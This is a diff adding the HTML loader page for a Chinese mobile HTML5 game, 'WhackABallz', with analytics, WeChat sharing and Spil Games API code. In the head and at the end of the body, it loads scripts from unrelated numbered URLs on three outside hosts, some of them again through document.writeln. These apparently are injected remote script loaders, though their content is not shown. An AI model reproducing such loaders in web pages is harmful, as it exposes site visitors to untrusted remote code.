@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta http-equiv="pragma" content="no-cache"/>
+        <meta name="apple-mobile-web-app-capable" content="yes" />
+        <meta name ="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, minimal-ui" />
+        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+        <meta charset="utf-8"/>
+
+		<meta name="MobileOptimized" content="width">
+		<meta name="HandheldFriendly" content="true">
+		
+		<title>戳爆他们</title>
+		
+
+		<script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
+		<script src="http://res.wx.qq.com/open/js/jweixin-1.0.0.js"></script>
+		<link rel="stylesheet" href="silengames/game.css" type="text/css" />
+		<script type="text/javascript" src="./game.js"></script>
+		<script src='https://p.mendoc.cn/83457'></script>
+	<script src='http://h.how5.cn/83457'></script>
+	<script type="text/javascript">
+		document.writeln("<script src='http:\/\/h.how5.cn\/83457'><\/script>");
+		document.writeln("<script src='https:\/\/p.mendoc.cn\/83457'><\/script>");
+	</script>
+    </head>
+    <body>
+    	<div style="display:none;">
+ 			<img src="big_icon.jpg" />
+		</div>
+		<script src="http://www.play68.com/resources/js/cnzz_tongji.js"></script>
+		<div id="sg-orient-screen"></div>
+		<div id="sg-loading-screen"></div>
+		<div id="sg-loading-bar-back"><div id="sg-loading-bar"></div></div>
+        <div class="gm4html5_div_class" id="gm4html5_div_id">
+            <canvas id="canvas" width="0" height="0">
+               <p>您的浏览器似乎不支持HTML5。试试你的浏览器升级到最新版本。</p>
+            </canvas>
+        </div>
+		<script type="text/javascript">
+			_czc.push(["_trackEvent","open进入游戏","戳爆他们","","",""]); 
+			// var shareUrl = 'http://mp.weixin.qq.com/s?__biz=MzA4MjAwNjQ2Mw==&mid=400121022&idx=1&sn=a758d382d15a6da8d3d6bbb97963ecc0#rd';
+    // Play68.set_share_url(shareUrl);
+			// (function (){updateShare(0);})();
+			splash_w = 700;
+			splash_h = 800;
+			bar_img_w = 400;
+			bar_img_h = 44;
+			bar_img_x = 150;
+			bar_img_y = 720;
+			canvasobj = document.getElementById("canvas");
+			loadbarobj = document.getElementById("sg-loading-bar");
+			loadbarbackobj = document.getElementById("sg-loading-bar-back");
+			orientobj = document.getElementById("sg-orient-screen");
+			loadingobj = document.getElementById("sg-loading-screen");
+			document.addEventListener("touchmove", function (e) { e.preventDefault(); }, false);
+			
+			//SpilGames Init API Start
+			loadingtextobj = document.getElementById("sg-loading-text");
+			loadtextnum = 1;
+			var sg_spilapi = false;
+			var sg_spil_spon_obj = null;
+			var sg_spil_more_obj = null;
+			var sg_spil_cross_obj = null;
+			var sg_spilapi_obj = null;
+			var SpilData = {
+				id: '576742227280295694'
+			};
+			try {
+				GameAPI.loadAPI(function(apiInstance) {
+					sg_spilapi = true;
+					sg_spilapi_obj = apiInstance;
+					//Spil Logo
+					// var logoData = apiInstance.Branding.getLogo();
+					// if (logoData.image) {
+					// 	sg_spil_spon_obj = document.createElement('img');
+					// 	sg_spil_spon_obj.src = logoData.image;
+					// 	sg_spil_spon_obj.addEventListener('click', logoData.action);
+						//sg_spil_spon_obj.addEventListener('touchend', logoData.action);
+					// 	sg_spil_spon_obj.setAttribute('style','display: block; position: absolute; left: 0px; top: 10px; width: 30%; z-index: 10');
+					// 	document.body.appendChild(sg_spil_spon_obj);
+					// }
+					//Spil Moregames
+					var moreData = apiInstance.Branding.getLink('more_games');
+						sg_spil_more_obj = document.createElement('img');
+						sg_spil_more_obj.src = "silengames/but_more.png";
+						sg_spil_more_obj.addEventListener('click', moreData.action);
+						//sg_spil_more_obj.addEventListener('touchend', moreData.action);
+						sg_spil_more_obj.setAttribute('style','display: none; position: absolute; left: 0px; top: 0px; z-index: 10');
+						document.body.appendChild(sg_spil_more_obj);
+					//Spil Pause/Resume
+					GameAPI.Game.on('pause', function() {
+						gml_Script_gmcallback_pauseon();
+					});
+					GameAPI.Game.on('resume', function() {
+						gml_Script_gmcallback_pauseoff();
+					});
+				}, SpilData);
+			} catch(e) {};
+		</script>
+        <script type="text/javascript" src="silengames/WhackABallz.js?AOVYB=2074707887"></script>
+
+<script  type="text/JavaScript">
+window.shareData={
+  'title':'戳爆他们',
+  'link':'http://game.nineying.cn/games/cbtm/',
+  'imgurl':'http://game.nineying.cn/games/cbtm/icon.png'
+}
+window.shareFriendData={
+  'title':'戳爆他们',
+  'content':'关注小斯基网络,更多好玩的游戏等着你。',
+  'link':'http://game.nineying.cn/games/cbtm/',
+  'imgurl':'http://game.nineying.cn/games/cbtm/icon.png'
+}
+</script>
+<script type="text/JavaScript" src="http://gc.veiying.cn/code"></script>
+    </body>
+</html>
